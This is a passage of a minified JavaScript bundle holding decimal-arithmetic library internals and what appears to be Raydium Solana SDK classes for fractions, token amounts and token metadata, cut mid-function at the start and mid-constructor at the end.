            for (i = 1, s = d[0]; s >= 10; s /= 10) i++;
            for (s = d[0] += a, a = 1; s >= 10; s /= 10) a++;
            i != a && (t.e++, d[0] == tk && (d[0] = 1));
            break;
          }
          if (((d[f] += a), d[f] != tk)) break;
          (d[f--] = 0), (a = 1);
        }
      for (i = d.length; 0 === d[--i]; ) d.pop();
    }
    return (
      KA &&
        (t.e > h.maxE
          ? ((t.d = null), (t.e = NaN))
          : t.e < h.minE && ((t.e = 0), (t.d = [0]))),
      t
    );
  }
  function lk(t, e, n) {
    if (!t.isFinite()) return Ak(t);
    var r,
      o = t.e,
      i = ok(t.d),
      s = i.length;
    return (
      e
        ? (n && (r = n - s) > 0
            ? (i = i.charAt(0) + "." + i.slice(1) + mk(r))
            : s > 1 && (i = i.charAt(0) + "." + i.slice(1)),
          (i = i + (t.e < 0 ? "e" : "e+") + t.e))
        : o < 0
        ? ((i = "0." + mk(-o - 1) + i), n && (r = n - s) > 0 && (i += mk(r)))
        : o >= s
        ? ((i += mk(o + 1 - s)),
          n && (r = n - o - 1) > 0 && (i = i + "." + mk(r)))
        : ((r = o + 1) < s && (i = i.slice(0, r) + "." + i.slice(r)),
          n && (r = n - s) > 0 && (o + 1 === s && (i += "."), (i += mk(r)))),
      i
    );
  }
  function dk(t, e) {
    var n = t[0];
    for (e *= 7; n >= 10; n /= 10) e++;
    return e;
  }
  function fk(t, e, n) {
    if (e > ek) throw ((KA = !0), n && (t.precision = n), Error(GA));
    return ck(new t(qA), e, 1, !0);
  }
  function hk(t, e, n) {
    if (e > nk) throw Error(GA);
    return ck(new t(WA), e, n, !0);
  }
  function pk(t) {
    var e = t.length - 1,
      n = 7 * e + 1;
    if ((e = t[e])) {
      for (; e % 10 == 0; e /= 10) n--;
      for (e = t[0]; e >= 10; e /= 10) n++;
    }
    return n;
  }
  function mk(t) {
    for (var e = ""; t--; ) e += "0";
    return e;
  }
  function gk(t, e, n, r) {
    var o,
      i = new t(1),
      s = Math.ceil(r / 7 + 4);
    for (KA = !1; ; ) {
      if (
        (n % 2 && Ck((i = i.times(e)).d, s) && (o = !0), 0 === (n = XA(n / 2)))
      ) {
        (n = i.d.length - 1), o && 0 === i.d[n] && ++i.d[n];
        break;
      }
      Ck((e = e.times(e)).d, s);
    }
    return (KA = !0), i;
  }
  function yk(t) {
    return 1 & t.d[t.d.length - 1];
  }
  function wk(t, e, n) {
    for (var r, o = new t(e[0]), i = 0; ++i < e.length; ) {
      if (!(r = new t(e[i])).s) {
        o = r;
        break;
      }
      o[n](r) && (o = r);
    }
    return o;
  }
  function bk(t, e) {
    var n,
      r,
      o,
      i,
      s,
      a,
      u,
      c = 0,
      l = 0,
      d = 0,
      f = t.constructor,
      h = f.rounding,
      p = f.precision;
    if (!t.d || !t.d[0] || t.e > 17)
      return new f(
        t.d
          ? t.d[0]
            ? t.s < 0
              ? 0
              : 1 / 0
            : 1
          : t.s
          ? t.s < 0
            ? 0
            : t
          : NaN
      );
    for (
      null == e ? ((KA = !1), (u = p)) : (u = e), a = new f(0.03125);
      t.e > -2;

    )
      (t = t.times(a)), (d += 5);
    for (
      u += r = ((Math.log(ZA(2, d)) / Math.LN10) * 2 + 5) | 0,
        n = i = s = new f(1),
        f.precision = u;
      ;

    ) {
      if (
        ((i = ck(i.times(t), u, 1)),
        (n = n.times(++l)),
        ok((a = s.plus(uk(i, n, u, 1))).d).slice(0, u) === ok(s.d).slice(0, u))
      ) {
        for (o = d; o--; ) s = ck(s.times(s), u, 1);
        if (null != e) return (f.precision = p), s;
        if (!(c < 3 && sk(s.d, u - r, h, c)))
          return ck(s, (f.precision = p), h, (KA = !0));
        (f.precision = u += 10), (n = i = a = new f(1)), (l = 0), c++;
      }
      s = a;
    }
  }
  function vk(t, e) {
    var n,
      r,
      o,
      i,
      s,
      a,
      u,
      c,
      l,
      d,
      f,
      h = 1,
      p = t,
      m = p.d,
      g = p.constructor,
      y = g.rounding,
      w = g.precision;
    if (p.s < 0 || !m || !m[0] || (!p.e && 1 == m[0] && 1 == m.length))
      return new g(m && !m[0] ? -1 / 0 : 1 != p.s ? NaN : m ? 0 : p);
    if (
      (null == e ? ((KA = !1), (l = w)) : (l = e),
      (g.precision = l += 10),
      (r = (n = ok(m)).charAt(0)),
      !(Math.abs((i = p.e)) < 15e14))
    )
      return (
        (c = fk(g, l + 2, w).times(i + "")),
        (p = vk(new g(r + "." + n.slice(1)), l - 10).plus(c)),
        (g.precision = w),
        null == e ? ck(p, w, y, (KA = !0)) : p
      );
    for (; (r < 7 && 1 != r) || (1 == r && n.charAt(1) > 3); )
      (r = (n = ok((p = p.times(t)).d)).charAt(0)), h++;
    for (
      i = p.e,
        r > 1
          ? ((p = new g("0." + n)), i++)
          : (p = new g(r + "." + n.slice(1))),
        d = p,
        u = s = p = uk(p.minus(1), p.plus(1), l, 1),
        f = ck(p.times(p), l, 1),
        o = 3;
      ;

    ) {
      if (
        ((s = ck(s.times(f), l, 1)),
        ok((c = u.plus(uk(s, new g(o), l, 1))).d).slice(0, l) ===
          ok(u.d).slice(0, l))
      ) {
        if (
          ((u = u.times(2)),
          0 !== i && (u = u.plus(fk(g, l + 2, w).times(i + ""))),
          (u = uk(u, new g(h), l, 1)),
          null != e)
        )
          return (g.precision = w), u;
        if (!sk(u.d, l - 10, y, a))
          return ck(u, (g.precision = w), y, (KA = !0));
        (g.precision = l += 10),
          (c = s = p = uk(d.minus(1), d.plus(1), l, 1)),
          (f = ck(p.times(p), l, 1)),
          (o = a = 1);
      }
      (u = c), (o += 2);
    }
  }
  function Ak(t) {
    return String((t.s * t.s) / 0);
  }
  function kk(t, e) {
    var n, r, o;
    for (
      (n = e.indexOf(".")) > -1 && (e = e.replace(".", "")),
        (r = e.search(/e/i)) > 0
          ? (n < 0 && (n = r), (n += +e.slice(r + 1)), (e = e.substring(0, r)))
          : n < 0 && (n = e.length),
        r = 0;
      48 === e.charCodeAt(r);
      r++
    );
    for (o = e.length; 48 === e.charCodeAt(o - 1); --o);
    if ((e = e.slice(r, o))) {
      if (
        ((o -= r),
        (t.e = n = n - r - 1),
        (t.d = []),
        (r = (n + 1) % 7),
        n < 0 && (r += 7),
        r < o)
      ) {
        for (r && t.d.push(+e.slice(0, r)), o -= 7; r < o; )
          t.d.push(+e.slice(r, (r += 7)));
        r = 7 - (e = e.slice(r)).length;
      } else r -= o;
      for (; r--; ) e += "0";
      t.d.push(+e),
        KA &&
          (t.e > t.constructor.maxE
            ? ((t.d = null), (t.e = NaN))
            : t.e < t.constructor.minE && ((t.e = 0), (t.d = [0])));
    } else (t.e = 0), (t.d = [0]);
    return t;
  }
  function Ik(t, e, n, r, o) {
    var i,
      s,
      a,
      u,
      c = t.precision,
      l = Math.ceil(c / 7);
    for (KA = !1, u = n.times(n), a = new t(r); ; ) {
      if (
        ((s = uk(a.times(u), new t(e++ * e++), c, 1)),
        (a = o ? r.plus(s) : r.minus(s)),
        (r = uk(s.times(u), new t(e++ * e++), c, 1)),
        void 0 !== (s = a.plus(r)).d[l])
      ) {
        for (i = l; s.d[i] === a.d[i] && i--; );
        if (-1 == i) break;
      }
      (i = a), (a = r), (r = s), (s = i);
    }
    return (KA = !0), (s.d.length = l + 1), s;
  }
  function Sk(t, e) {
    for (var n = t; --e; ) n *= t;
    return n;
  }
  function _k(t, e) {
    var n,
      r = e.s < 0,
      o = hk(t, t.precision, 1),
      i = o.times(0.5);
    if ((e = e.abs()).lte(i)) return (LA = r ? 4 : 1), e;
    if ((n = e.divToInt(o)).isZero()) LA = r ? 3 : 2;
    else {
      if ((e = e.minus(n.times(o))).lte(i))
        return (LA = yk(n) ? (r ? 2 : 3) : r ? 4 : 1), e;
      LA = yk(n) ? (r ? 1 : 4) : r ? 3 : 2;
    }
    return e.minus(o).abs();
  }
  function Tk(t, e, n, r) {
    var o,
      i,
      s,
      a,
      u,
      c,
      l,
      d,
      f,
      h = t.constructor,
      p = void 0 !== n;
    if (
      (p
        ? (ik(n, 1, DA), void 0 === r ? (r = h.rounding) : ik(r, 0, 8))
        : ((n = h.precision), (r = h.rounding)),
      t.isFinite())
    ) {
      for (
        p
          ? ((o = 2), 16 == e ? (n = 4 * n - 3) : 8 == e && (n = 3 * n - 2))
          : (o = e),
          (s = (l = lk(t)).indexOf(".")) >= 0 &&
            ((l = l.replace(".", "")),
            ((f = new h(1)).e = l.length - s),
            (f.d = ak(lk(f), 10, o)),
            (f.e = f.d.length)),
          i = u = (d = ak(l, 10, o)).length;
        0 == d[--u];

      )
        d.pop();
      if (d[0]) {
        if (
          (s < 0
            ? i--
            : (((t = new h(t)).d = d),
              (t.e = i),
              (d = (t = uk(t, f, n, r, 0, o)).d),
              (i = t.e),
              (c = MA)),
          (s = d[n]),
          (a = o / 2),
          (c = c || void 0 !== d[n + 1]),
          (c =
            r < 4
              ? (void 0 !== s || c) && (0 === r || r === (t.s < 0 ? 3 : 2))
              : s > a ||
                (s === a &&
                  (4 === r ||
                    c ||
                    (6 === r && 1 & d[n - 1]) ||
                    r === (t.s < 0 ? 8 : 7)))),
          (d.length = n),
          c)
        )
          for (; ++d[--n] > o - 1; ) (d[n] = 0), n || (++i, d.unshift(1));
        for (u = d.length; !d[u - 1]; --u);
        for (s = 0, l = ""; s < u; s++) l += UA.charAt(d[s]);
        if (p) {
          if (u > 1)
            if (16 == e || 8 == e) {
              for (s = 16 == e ? 4 : 3, --u; u % s; u++) l += "0";
              for (u = (d = ak(l, o, e)).length; !d[u - 1]; --u);
              for (s = 1, l = "1."; s < u; s++) l += UA.charAt(d[s]);
            } else l = l.charAt(0) + "." + l.slice(1);
          l = l + (i < 0 ? "p" : "p+") + i;
        } else if (i < 0) {
          for (; ++i; ) l = "0" + l;
          l = "0." + l;
        } else if (++i > u) for (i -= u; i--; ) l += "0";
        else i < u && (l = l.slice(0, i) + "." + l.slice(i));
      } else l = p ? "0p+0" : "0";
      l = (16 == e ? "0x" : 2 == e ? "0b" : 8 == e ? "0o" : "") + l;
    } else l = Ak(t);
    return t.s < 0 ? "-" + l : l;
  }
  function Ck(t, e) {
    if (t.length > e) return (t.length = e), !0;
  }
  function Bk(t) {
    return new this(t).abs();
  }
  function Ek(t) {
    return new this(t).acos();
  }
  function xk(t) {
    return new this(t).acosh();
  }
  function Pk(t, e) {
    return new this(t).plus(e);
  }
  function Rk(t) {
    return new this(t).asin();
  }
  function Ok(t) {
    return new this(t).asinh();
  }
  function Mk(t) {
    return new this(t).atan();
  }
  function Lk(t) {
    return new this(t).atanh();
  }
  function Nk(t, e) {
    (t = new this(t)), (e = new this(e));
    var n,
      r = this.precision,
      o = this.rounding,
      i = r + 4;
    return (
      t.s && e.s
        ? t.d || e.d
          ? !e.d || t.isZero()
            ? ((n = e.s < 0 ? hk(this, r, o) : new this(0)).s = t.s)
            : !t.d || e.isZero()
            ? ((n = hk(this, i, 1).times(0.5)).s = t.s)
            : e.s < 0
            ? ((this.precision = i),
              (this.rounding = 1),
              (n = this.atan(uk(t, e, i, 1))),
              (e = hk(this, i, 1)),
              (this.precision = r),
              (this.rounding = o),
              (n = t.s < 0 ? n.minus(e) : n.plus(e)))
            : (n = this.atan(uk(t, e, i, 1)))
          : ((n = hk(this, i, 1).times(e.s > 0 ? 0.25 : 0.75)).s = t.s)
        : (n = new this(NaN)),
      n
    );
  }
  function Dk(t) {
    return new this(t).cbrt();
  }
  function Uk(t) {
    return ck((t = new this(t)), t.e + 1, 2);
  }
  function qk(t, e, n) {
    return new this(t).clamp(e, n);
  }
  function Wk(t) {
    if (!t || "object" != typeof t) throw Error(FA + "Object expected");
    var e,
      n,
      r,
      o = !0 === t.defaults,
      i = [
        "precision",
        1,
        DA,
        "rounding",
        0,
        8,
        "toExpNeg",
        -NA,
        0,
        "toExpPos",
        0,
        NA,
        "maxE",
        0,
        NA,
        "minE",
        -NA,
        0,
        "modulo",
        0,
        9,
      ];
    for (e = 0; e < i.length; e += 3)
      if (((n = i[e]), o && (this[n] = zA[n]), void 0 !== (r = t[n]))) {
        if (!(XA(r) === r && r >= i[e + 1] && r <= i[e + 2]))
          throw Error(jA + n + ": " + r);
        this[n] = r;
      }
    if (((n = "crypto"), o && (this[n] = zA[n]), void 0 !== (r = t[n]))) {
      if (!0 !== r && !1 !== r && 0 !== r && 1 !== r)
        throw Error(jA + n + ": " + r);
      if (r) {
        if (
          !(
            typeof crypto < "u" &&
            crypto &&
            (crypto.getRandomValues || crypto.randomBytes)
          )
        )
          throw Error(VA);
        this[n] = !0;
      } else this[n] = !1;
    }
    return this;
  }
  function zk(t) {
    return new this(t).cos();
  }
  function Kk(t) {
    return new this(t).cosh();
  }
  function Fk(t, e) {
    return new this(t).div(e);
  }
  function jk(t) {
    return new this(t).exp();
  }
  function Gk(t) {
    return ck((t = new this(t)), t.e + 1, 3);
  }
  function Vk() {
    var t,
      e,
      n = new this(0);
    for (KA = !1, t = 0; t < arguments.length; )
      if ((e = new this(arguments[t++])).d) n.d && (n = n.plus(e.times(e)));
      else {
        if (e.s) return (KA = !0), new this(1 / 0);
        n = e;
      }
    return (KA = !0), n.sqrt();
  }
  function Hk(t) {
    return t instanceof pI || (t && t.toStringTag === HA) || !1;
  }
  function Xk(t) {
    return new this(t).ln();
  }
  function Zk(t, e) {
    return new this(t).log(e);
  }
  function Jk(t) {
    return new this(t).log(2);
  }
  function Yk(t) {
    return new this(t).log(10);
  }
  function Qk() {
    return wk(this, arguments, "lt");
  }
  function $k() {
    return wk(this, arguments, "gt");
  }
  function tI(t, e) {
    return new this(t).mod(e);
  }
  function eI(t, e) {
    return new this(t).mul(e);
  }
  function nI(t, e) {
    return new this(t).pow(e);
  }
  function rI(t) {
    var e,
      n,
      r,
      o,
      i = 0,
      s = new this(1),
      a = [];
    if (
      (void 0 === t ? (t = this.precision) : ik(t, 1, DA),
      (r = Math.ceil(t / 7)),
      this.crypto)
    )
      if (crypto.getRandomValues)
        for (e = crypto.getRandomValues(new Uint32Array(r)); i < r; )
          (o = e[i]) >= 429e7
            ? (e[i] = crypto.getRandomValues(new Uint32Array(1))[0])
            : (a[i++] = o % 1e7);
      else {
        if (!crypto.randomBytes) throw Error(VA);
        for (e = crypto.randomBytes((r *= 4)); i < r; )
          (o =
            e[i] +
            (e[i + 1] << 8) +
            (e[i + 2] << 16) +
            ((127 & e[i + 3]) << 24)) >= 214e7
            ? crypto.randomBytes(4).copy(e, i)
            : (a.push(o % 1e7), (i += 4));
        i = r / 4;
      }
    else for (; i < r; ) a[i++] = (1e7 * Math.random()) | 0;
    for (
      t %= 7,
        (r = a[--i]) && t && ((o = ZA(10, 7 - t)), (a[i] = ((r / o) | 0) * o));
      0 === a[i];
      i--
    )
      a.pop();
    if (i < 0) (n = 0), (a = [0]);
    else {
      for (n = -1; 0 === a[0]; n -= 7) a.shift();
      for (r = 1, o = a[0]; o >= 10; o /= 10) r++;
      r < 7 && (n -= 7 - r);
    }
    return (s.e = n), (s.d = a), s;
  }
  function oI(t) {
    return ck((t = new this(t)), t.e + 1, this.rounding);
  }
  function iI(t) {
    return (t = new this(t)).d ? (t.d[0] ? t.s : 0 * t.s) : t.s || NaN;
  }
  function sI(t) {
    return new this(t).sin();
  }
  function aI(t) {
    return new this(t).sinh();
  }
  function uI(t) {
    return new this(t).sqrt();
  }
  function cI(t, e) {
    return new this(t).sub(e);
  }
  function lI() {
    var t = 0,
      e = arguments,
      n = new this(e[t]);
    for (KA = !1; n.s && ++t < e.length; ) n = n.plus(e[t]);
    return (KA = !0), ck(n, this.precision, this.rounding);
  }
  function dI(t) {
    return new this(t).tan();
  }
  function fI(t) {
    return new this(t).tanh();
  }
  function hI(t) {
    return ck((t = new this(t)), t.e + 1, 1);
  }
  (rk[Symbol.for("nodejs.util.inspect.custom")] = rk.toString),
    (rk[Symbol.toStringTag] = "Decimal");
  var pI = (rk.constructor = (function t(e) {
    var n, r, o;
    function i(t) {
      var e,
        n,
        r,
        o = this;
      if (!(o instanceof i)) return new i(t);
      if (((o.constructor = i), Hk(t)))
        return (
          (o.s = t.s),
          KA
            ? !t.d || t.e > i.maxE
              ? ((o.e = NaN), (o.d = null))
              : t.e < i.minE
              ? ((o.e = 0), (o.d = [0]))
              : ((o.e = t.e), (o.d = t.d.slice()))
            : ((o.e = t.e), (o.d = t.d ? t.d.slice() : t.d)),
          void 0
        );
      if ("number" === (r = typeof t)) {
        if (0 === t)
          return (o.s = 1 / t < 0 ? -1 : 1), (o.e = 0), (o.d = [0]), void 0;
        if (
          (t < 0 ? ((t = -t), (o.s = -1)) : (o.s = 1), t === ~~t && t < 1e7)
        ) {
          for (e = 0, n = t; n >= 10; n /= 10) e++;
          return (
            KA
              ? e > i.maxE
                ? ((o.e = NaN), (o.d = null))
                : e < i.minE
                ? ((o.e = 0), (o.d = [0]))
                : ((o.e = e), (o.d = [t]))
              : ((o.e = e), (o.d = [t])),
            void 0
          );
        }
        return 0 * t != 0
          ? (t || (o.s = NaN), (o.e = NaN), (o.d = null), void 0)
          : kk(o, t.toString());
      }
      if ("string" !== r) throw Error(jA + t);
      return (
        45 === (n = t.charCodeAt(0))
          ? ((t = t.slice(1)), (o.s = -1))
          : (43 === n && (t = t.slice(1)), (o.s = 1)),
        $A.test(t)
          ? kk(o, t)
          : (function (t, e) {
              var n, r, o, i, s, a, u, c, l;
              if (e.indexOf("_") > -1) {
                if (((e = e.replace(/(\d)_(?=\d)/g, "$1")), $A.test(e)))
                  return kk(t, e);
              } else if ("Infinity" === e || "NaN" === e)
                return +e || (t.s = NaN), (t.e = NaN), (t.d = null), t;
              if (YA.test(e)) (n = 16), (e = e.toLowerCase());
              else if (JA.test(e)) n = 2;
              else {
                if (!QA.test(e)) throw Error(jA + e);
                n = 8;
              }
              for (
                (i = e.search(/p/i)) > 0
                  ? ((u = +e.slice(i + 1)), (e = e.substring(2, i)))
                  : (e = e.slice(2)),
                  s = (i = e.indexOf(".")) >= 0,
                  r = t.constructor,
                  s &&
                    ((i = (a = (e = e.replace(".", "")).length) - i),
                    (o = gk(r, new r(n), i, 2 * i))),
                  i = l = (c = ak(e, n, tk)).length - 1;
                0 === c[i];
                --i
              )
                c.pop();
              return i < 0
                ? new r(0 * t.s)
                : ((t.e = dk(c, l)),
                  (t.d = c),
                  (KA = !1),
                  s && (t = uk(t, o, 4 * a)),
                  u &&
                    (t = t.times(Math.abs(u) < 54 ? ZA(2, u) : pI.pow(2, u))),
                  (KA = !0),
                  t);
            })(o, t)
      );
    }
    if (
      ((i.prototype = rk),
      (i.ROUND_UP = 0),
      (i.ROUND_DOWN = 1),
      (i.ROUND_CEIL = 2),
      (i.ROUND_FLOOR = 3),
      (i.ROUND_HALF_UP = 4),
      (i.ROUND_HALF_DOWN = 5),
      (i.ROUND_HALF_EVEN = 6),
      (i.ROUND_HALF_CEIL = 7),
      (i.ROUND_HALF_FLOOR = 8),
      (i.EUCLID = 9),
      (i.config = i.set = Wk),
      (i.clone = t),
      (i.isDecimal = Hk),
      (i.abs = Bk),
      (i.acos = Ek),
      (i.acosh = xk),
      (i.add = Pk),
      (i.asin = Rk),
      (i.asinh = Ok),
      (i.atan = Mk),
      (i.atanh = Lk),
      (i.atan2 = Nk),
      (i.cbrt = Dk),
      (i.ceil = Uk),
      (i.clamp = qk),
      (i.cos = zk),
      (i.cosh = Kk),
      (i.div = Fk),
      (i.exp = jk),
      (i.floor = Gk),
      (i.hypot = Vk),
      (i.ln = Xk),
      (i.log = Zk),
      (i.log10 = Yk),
      (i.log2 = Jk),
      (i.max = Qk),
      (i.min = $k),
      (i.mod = tI),
      (i.mul = eI),
      (i.pow = nI),
      (i.random = rI),
      (i.round = oI),
      (i.sign = iI),
      (i.sin = sI),
      (i.sinh = aI),
      (i.sqrt = uI),
      (i.sub = cI),
      (i.sum = lI),
      (i.tan = dI),
      (i.tanh = fI),
      (i.trunc = hI),
      void 0 === e && (e = {}),
      e && !0 !== e.defaults)
    )
      for (
        o = [
          "precision",
          "rounding",
          "toExpNeg",
          "toExpPos",
          "maxE",
          "minE",
          "modulo",
          "crypto",
        ],
          n = 0;
        n < o.length;

      )
        e.hasOwnProperty((r = o[n++])) || (e[r] = this[r]);
    return i.config(e), i;
  })(zA));
  (qA = new pI(qA)), (WA = new pI(WA));
  var mI = pI,
    gI = Lv,
    yI = ((t) => (
      (t[(t.ROUND_DOWN = 0)] = "ROUND_DOWN"),
      (t[(t.ROUND_HALF_UP = 1)] = "ROUND_HALF_UP"),
      (t[(t.ROUND_UP = 2)] = "ROUND_UP"),
      t
    ))(yI || {}),
    wI = 9007199254740991;
  function bI(t) {
    let e = CA("Raydium_parseBigNumberish");
    if (t instanceof Zn) return t;
    if ("string" == typeof t) {
      if (t.match(/^-?[0-9]+$/)) return new Zn(t);
      e.logWithError(`invalid BigNumberish string: ${t}`);
    }
    return "number" == typeof t
      ? (t % 1 && e.logWithError(`BigNumberish number underflow: ${t}`),
        (t >= wI || t <= -wI) &&
          e.logWithError(`BigNumberish number overflow: ${t}`),
        new Zn(String(t)))
      : "bigint" == typeof t
      ? new Zn(t.toString())
      : (e.error(`invalid BigNumberish value: ${t}`), new Zn(0));
  }
  var vI = CA("module/fraction"),
    AI = gI(Rv),
    kI = gI(dA),
    II = { 0: kI.ROUND_DOWN, 1: kI.ROUND_HALF_UP, 2: kI.ROUND_UP },
    SI = { 0: Rv.roundDown, 1: Rv.roundHalfUp, 2: Rv.roundUp },
    _I = class {
      constructor(t, e = new Zn(1)) {
        (this.numerator = bI(t)), (this.denominator = bI(e));
      }
      get quotient() {
        return this.numerator.div(this.denominator);
      }
      invert() {
        return new _I(this.denominator, this.numerator);
      }
      add(t) {
        let e = t instanceof _I ? t : new _I(bI(t));
        return this.denominator.eq(e.denominator)
          ? new _I(this.numerator.add(e.numerator), this.denominator)
          : new _I(
              this.numerator
                .mul(e.denominator)
                .add(e.numerator.mul(this.denominator)),
              this.denominator.mul(e.denominator)
            );
      }
      sub(t) {
        let e = t instanceof _I ? t : new _I(bI(t));
        return this.denominator.eq(e.denominator)
          ? new _I(this.numerator.sub(e.numerator), this.denominator)
          : new _I(
              this.numerator
                .mul(e.denominator)
                .sub(e.numerator.mul(this.denominator)),
              this.denominator.mul(e.denominator)
            );
      }
      mul(t) {
        let e = t instanceof _I ? t : new _I(bI(t));
        return new _I(
          this.numerator.mul(e.numerator),
          this.denominator.mul(e.denominator)
        );
      }
      div(t) {
        let e = t instanceof _I ? t : new _I(bI(t));
        return new _I(
          this.numerator.mul(e.denominator),
          this.denominator.mul(e.numerator)
        );
      }
      toSignificant(t, e = { groupSeparator: "" }, n = 1) {
        Number.isInteger(t) || vI.logWithError(`${t} is not an integer.`),
          t <= 0 && vI.logWithError(`${t} is not positive.`),
          kI.set({ precision: t + 1, rounding: II[n] });
        let r = new kI(this.numerator.toString())
          .div(this.denominator.toString())
          .toSignificantDigits(t);
        return r.toFormat(r.decimalPlaces(), e);
      }
      toFixed(t, e = { groupSeparator: "" }, n = 1) {
        return (
          Number.isInteger(t) || vI.logWithError(`${t} is not an integer.`),
          t < 0 && vI.logWithError(`${t} is negative.`),
          (AI.DP = t),
          (AI.RM = SI[n] || 1),
          new AI(this.numerator.toString())
            .div(this.denominator.toString())
            .toFormat(t, e)
        );
      }
      isZero() {
        return this.numerator.isZero();
      }
    },
    TI = CA("Raydium_amount"),
    CI = gI(Rv);
  var BI = class extends _I {
      constructor(t, e, n = !0, r) {
        let o = new Zn(0),
          i = tS.pow(new Zn(t.decimals));
        if (n) o = bI(e);
        else {
          let n = new Zn(0),
            r = new Zn(0);
          if (
            "string" == typeof e ||
            "number" == typeof e ||
            "bigint" == typeof e
          ) {
            let [o, i] = (function (t, e) {
              let n = "0",
                r = "0";
              if (t.includes(".")) {
                let o = t.split(".");
                2 === o.length
                  ? (([n, r] = o), (r = r.padEnd(e, "0")))
                  : TI.logWithError(`invalid number string, num: ${t}`);
              } else n = t;
              return [n, r.slice(0, e) || r];
            })(e.toString(), t.decimals);
            (n = bI(o)), (r = bI(i));
          }
          (n = n.mul(i)), (o = n.add(r));
        }
        super(o, i), (this.logger = CA(r || "TokenAmount")), (this.token = t);
      }
      get raw() {
        return this.numerator;
      }
      isZero() {
        return this.raw.isZero();
      }
      gt(t) {
        return (
          this.token.equals(t.token) ||
            this.logger.logWithError("gt token not equals"),
          this.raw.gt(t.raw)
        );
      }
      lt(t) {
        return (
          this.token.equals(t.token) ||
            this.logger.logWithError("lt token not equals"),
          this.raw.lt(t.raw)
        );
      }
      add(t) {
        return (
          this.token.equals(t.token) ||
            this.logger.logWithError("add token not equals"),
          new BI(this.token, this.raw.add(t.raw))
        );
      }
      subtract(t) {
        return (
          this.token.equals(t.token) ||
            this.logger.logWithError("sub token not equals"),
          new BI(this.token, this.raw.sub(t.raw))
        );
      }
      toSignificant(t = this.token.decimals, e, n = 0) {
        return super.toSignificant(t, e, n);
      }
      toFixed(t = this.token.decimals, e, n = 0) {
        return (
          t > this.token.decimals &&
            this.logger.logWithError("decimals overflow"),
          super.toFixed(t, e, n)
        );
      }
      toExact(t = { groupSeparator: "" }) {
        return (
          (CI.DP = this.token.decimals),
          new CI(this.numerator.toString())
            .div(this.denominator.toString())
            .toFormat(t)
        );
      }
    },
    EI = {
      chainId: 101,
      address: Xi.default.toBase58(),
      programId: _c.toBase58(),
      decimals: 9,
      symbol: "SOL",
      name: "solana",
      logoURI:
        "https://img-v1.raydium.io/icon/So11111111111111111111111111111111111111112.png",
      tags: [],
      priority: 2,
      type: "raydium",
      extensions: { coingeckoId: "solana" },
    },
    xI = {
      chainId: 101,
      address: "So11111111111111111111111111111111111111112",
      programId: _c.toBase58(),
      decimals: 9,
      symbol: "WSOL",
      name: "Wrapped SOL",
      logoURI:
        "https://img-v1.raydium.io/icon/So11111111111111111111111111111111111111112.png",
      tags: [],
      priority: 2,
      type: "raydium",
      extensions: { coingeckoId: "solana" },
    };
  function PI({ pubkey: t, isSigner: e = !1, isWritable: n = !0 }) {
    return { pubkey: t, isWritable: n, isSigner: e };
  }
  var RI = [
    PI({ pubkey: _c, isWritable: !1 }),
    PI({ pubkey: Fs.programId, isWritable: !1 }),
    PI({ pubkey: Ts, isWritable: !1 }),
  ];
  function OI({ publicKey: t, transformSol: e }) {
    let n = MI(t.toString());
    if (n instanceof Xi) return e && n.equals(KI) ? zI : n;
    if (e && n.toString() === KI.toBase58()) return zI;
    if ("string" == typeof n) {
      if (n === Xi.default.toBase58()) return Xi.default;
      try {
        return new Xi(n);
      } catch {
        throw new Error("invalid public key");
      }
    }
    throw new Error("invalid public key");
  }
  function MI(t) {
    try {
      return new Xi(t);
    } catch {
      return t;
    }
  }
  var LI = new Xi("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"),
    NI = new Xi("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"),
    DI = new Xi("SysvarRent111111111111111111111111111111111"),
    UI = new Xi("SysvarC1ock11111111111111111111111111111111"),
    qI = new Xi("metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s");
  new Xi("Sysvar1nstructions1111111111111111111111111");
  var WI = Fs.programId;
  new Xi("4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R"),
    new Xi("Ea5SjE2Y6yvCeW5dYTn7PYMuW5ikXkvbGdcmSnXeaLjS"),
    new Xi("SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt"),
    new Xi("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"),
    new Xi("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"),
    new Xi("mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So"),
    new Xi("7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj"),
    new Xi("USDH1SM1ojwWUga67PGrgFWUHibbjqMvuMaDkRJTgkX"),
    new Xi("NRVwhjBQiUPYtfDT5zRBVJajzFQHaBUNtC7SNVvqRFa"),
    new Xi("ANAxByE6G2WjFp7A4NqtWYXb3mgruyzZYg3spfxe6Lbo"),
    new Xi("7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs");
  var zI = new Xi("So11111111111111111111111111111111111111112"),
    KI = Xi.default;
  function FI(t) {
    return OI({ publicKey: t, transformSol: !0 });
  }
  var jI = class {
      constructor({
        mint: t,
        decimals: e,
        symbol: n,
        name: r,
        skipMint: o = !1,
        isToken2022: i = !1,
      }) {
        if (t === KI.toBase58() || (t instanceof Xi && KI.equals(t)))
          return (
            (this.decimals = xI.decimals),
            (this.symbol = xI.symbol),
            (this.name = xI.name),
            (this.mint = new Xi(xI.address)),
            (this.isToken2022 = !1),
            void 0
          );
        (this.decimals = e),
          (this.symbol = n || t.toString().substring(0, 6)),
          (this.name = r || t.toString().substring(0, 6)),
          (this.mint = o ? Xi.default : OI({ publicKey: t })),
          (this.isToken2022 = i);
      }
      equals(t) {
        return this === t || this.mint.equals(t.mint);
      }
    },
    GI = jI;
  GI.WSOL = new jI(AA(vA({}, xI), { mint: xI.address }));
  var VI = class {
    constructor({ decimals: t, symbol: e = "UNKNOWN", name: n = "UNKNOWN" }) {
      (this.decimals = t), (this.symbol = e), (this.name = n);
    }
    equals(t) {
      return this === t;
    }
  };
  VI.SOL = new VI(EI);
  var HI = new _I(new Zn(100)),
    XI = class extends _I {
      toSignificant(t = 5, e, n) {
        return this.mul(HI).toSignificant(t, e, n);
      }
      toFixed(t = 2, e, n) {
        return this.mul(HI).toFixed(t, e, n);
      }
    },
    ZI = CA("Raydium_price"),
    JI = class extends _I {
      constructor(t) {
        let { baseToken: e, quoteToken: n, numerator: r, denominator: o } = t;
